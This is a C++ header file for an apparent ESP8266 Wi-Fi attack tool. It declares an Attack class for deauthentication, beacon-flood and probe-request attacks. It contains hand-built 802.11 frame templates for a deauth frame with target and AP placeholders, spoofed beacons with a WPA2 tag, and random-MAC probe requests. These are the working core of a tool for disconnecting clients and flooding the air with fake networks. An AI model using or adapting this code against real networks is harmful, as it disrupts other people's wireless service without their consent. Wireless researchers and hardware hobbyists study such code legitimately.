#ifndef Attack_h
#define Attack_h

#define maxChannel 11

#include <ESP8266WiFi.h>

extern "C" {
#include "user_interface.h"
}

#include "Mac.h"
#include "MacList.h"
#include "APScan.h"
#include "ClientScan.h"
#include "Settings.h"
#include "SSIDList.h"

#define attacksNum 3
#define macListLen 64

extern void PrintHex8(uint8_t *data, uint8_t length);
extern void getRandomVendorMac(uint8_t *buf);
extern String data_getVendor(uint8_t first, uint8_t second, uint8_t third);
extern const bool debug;
extern void addLog(String str);
extern void openLog();
extern void closeLog();
extern String attackMode_deauth;
extern String attackMode_beacon;

extern APScan apScan;
extern ClientScan clientScan;
extern Settings settings;
extern SSIDList ssidList;

class Attack
{
  public:
    Attack();
    void generate();
    void run();
    void start(int num);
    void stop(int num);
    void stopAll();
    void sendResults();
    size_t getSize();
    void refreshLed();
    void changeRandom(int num);

    bool ssidChange = true;
  private:

    void buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason);
    void buildBeacon(Mac _ap, String _ssid, int _ch, bool encrypt);
    void _log(int num);
    void buildProbe(String _ssid, Mac _mac);
    bool send();

    void sendDeauths(Mac from, Mac to);
    
    //attack declarations
    const String attackNames[attacksNum] = {"Deauth", "Beacon", "Probe-Request"};

    //attack infos
    String stati[attacksNum];
    unsigned int packetsCounter[attacksNum];
    bool isRunning[attacksNum];

    MacList beaconAdrs;

    //packet buffer
    uint8_t packet[128];
    int packetSize;

    //timestamp for running every attack
    unsigned long prevTime[attacksNum];

    //packet declarations
    uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };

    uint8_t beaconPacket_header[36] = {
      /*  0 - 1  */ 0x80, 0x00,
      /*  2 - 3  */ 0x00, 0x00, //beacon
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination: broadcast
      /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
      /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
      /* 22 - 23 */ 0xc0, 0x6c,
      /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
      /* 32 - 33 */ 0x64, 0x00, //0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
      /* 34 - 35 */ 0x01, 0x04
      /*,0x00, 0x06, //SSID size
         0x72, 0x72, 0x72, 0x72, 0x72, 0x72, //SSID
         >>beaconPacket_end<<*/
    };

    uint8_t beaconPacket_end[12] = {
      0x01, 0x08, 0x82, 0x84,
      0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01
      /*,channel*/
    };

    uint8_t beaconWPA2tag[26] = {
      0x30, //RSN tag
      0x18, //tag length
      0x01, 0x00, //RSN version
      0x00, 0x0f, 0xac, 0x02, //cipher (TKIP)
      0x02, 0x00, //pair cipher
      0x00, 0x0f, 0xac, 0x04, //cipher (AES)
      0x00, 0x0f, 0xac, 0x02, //cipher (TKIP)
      0x01, 0x00, //AKM count
      0x00, 0x0f, 0xac, 0x02, //PSK
      0x00, 0x00 //RSN capabilities
    };

    uint8_t probePacket[25] = {
      /*  0 - 1  */ 0x40, 0x00,                         //Type: Probe Request
      /*  2 - 3  */ 0x00, 0x00,                         //Duration: 0 microseconds
      /*  4 - 9  */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination: Broadcast
      /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, //Source: random MAC
      /* 16 - 21 */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //BSS Id: Broadcast
      /* 22 - 23 */ 0x00, 0x00,                         //Sequence number (will be replaced by the SDK)
      /*    24   */ 0x00                                //Tag Number: SSID parameter set (0)
      /*           ,0x06,                              //Tag length
                    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA //SSID
      */
    };

    uint8_t probePacket_RateTag[6] = {
      0x01, //Tag Number: Supported Rates (1)
      0x04, //Tag length: 4
      //Supported Rates:
      0x82, //1Mbit/s
      0x84, //2Mbit/s
      0x8b, //5.5Mbit/s
      0x96  //11Mbit/s
    };

    int macListChangeCounter = 0;
    int attackTimeoutCounter[attacksNum];
    int channels[macListLen];
    bool buildInLedStatus = false;

    bool randomMode = false;
    int randomInterval = 5;
    int randomCounter = 0;
    long randomTime = 0;
};

#endif
